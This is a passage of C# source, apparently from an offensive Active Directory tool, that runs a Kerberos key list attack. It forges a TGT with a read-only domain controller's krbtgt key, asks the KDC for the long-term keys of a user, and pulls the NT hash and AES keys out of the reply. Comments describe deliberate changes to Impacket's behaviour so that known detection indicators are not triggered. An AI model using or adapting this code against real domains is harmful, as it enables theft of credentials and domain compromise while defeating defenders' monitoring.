		logonInfo.SetGroupIds([new RidWithAttributes(513, SidAttributes.Mandatory | SidAttributes.EnabledByDefault | SidAttributes.Enabled)]);

		var sessionKeyBytes = RandomNumberGenerator.GetBytes(32);
		var sessionKey = new SessionKey(rodcProfile, sessionKeyBytes);
		var serverKey = new SessionKey(rodcProfile, rodcKeyBytes);

		TicketInfo forgedTgt = krb.ForgeTicket(
			KdcOptions.Forwardable | KdcOptions.Renewable | (KdcOptions)(1 << 20),   // forwardable + renewable + enc-pa-re
			new UserPrincipalName(user, realm),
			realm,                       // client realm
			realm,                       // ticket realm
			new ServicePrincipalName(PrincipalNameType.ServiceInstance, ServiceClassNames.Krbtgt, realm),
			realm,                       // service realm
			sessionKey,
			serverKey,                   // RODC krbtgt key signs the PAC and encrypts the enc-part
			now,                         // auth time
			now.AddDays(120),            // end time
			null,                        // start time
			now.AddDays(120),            // renew till
			logonInfo,
			null,                        // upnDnsInfo
			serverKey,                   // kdcKey: both PAC checksums signed by RODC key
			(uint)(this.RodcNo!.Value << 16)   // ticket enc-part kvno selects the RODC key on the KDC side
			);

		// 2. TGS-REQ to krbtgt/realm with the forged TGT and KERB-KEY-LIST-REQ.
		//
		// Deliberate divergences from Impacket's keylistattack.py fingerprints
		// (ref: ThatTotallyRealMyth/Impacket-IoCs IoC 62):
		//   * Key list requests ALL supported long-term key types (RC4 + AES256
		//     + AES128) instead of an RC4-only list.
		//   * Request-body etypes are AES-first ordered instead of RC4-only
		//     (also avoids the IoC 05 RC4-first ordering).
		//   * Lifetime is 13 hours instead of Impacket's exact now+24h.
		// Protocol-mandated elements that cannot differ: sname = krbtgt/<realm>,
		// enc-pa-re ticket flag (reply PA-DATA is carried encrypted), and
		// kvno = rodcNo << 16 ([MS-KILE] § 2.2.6).
		var ticketParams = new TicketParameters
		{
			Options = KdcOptions.Canonicalize,
			EndTime = now.AddHours(13),
			KeyListEtypes = [EType.Rc4Hmac, EType.Aes256CtsHmacSha1_96, EType.Aes128CtsHmacSha1_96],
		};

		SecurityPrincipalName krbtgtSpn = new ServicePrincipalName(PrincipalNameType.ServiceInstance, ServiceClassNames.Krbtgt, realm);
		TicketInfo fullTgt = await krb.RequestTicket(
			forgedTgt,
			krbtgtSpn,
			realm,
			[EType.Aes256CtsHmacSha1_96, EType.Aes128CtsHmacSha1_96, EType.Rc4Hmac],
			ticketParams,
			cancellationToken).ConfigureAwait(false);

		// 3. Extract the NT hash from the KERB-KEY-LIST-REP.
		if (fullTgt.KeyListKeys is null || fullTgt.KeyListKeys.Length == 0)
			throw new SecurityException("KDC response did not contain a KERB-KEY-LIST-REP");

		string? ntHash = null;
		List<string> others = new List<string>();
		foreach (var k in fullTgt.KeyListKeys)
		{
			string hex = Convert.ToHexString(k.Key).ToLowerInvariant();
			if (k.EType == (int)EType.Rc4Hmac)
				ntHash = hex;
			else if (((EType)k.EType) is EType.Aes256CtsHmacSha1_96 or EType.Aes128CtsHmacSha1_96)
				others.Add($"aes{(k.Key.Length * 8)}:{hex}");
		}

		if (ntHash is not null)
			AtlasConsole.Info($"{this.KdcServer}:{KdcPort}", $"{realm}\\{user} additional keys: " + string.Join(", ", others));
		return ntHash ?? others.FirstOrDefault() ?? string.Empty;
	}
}
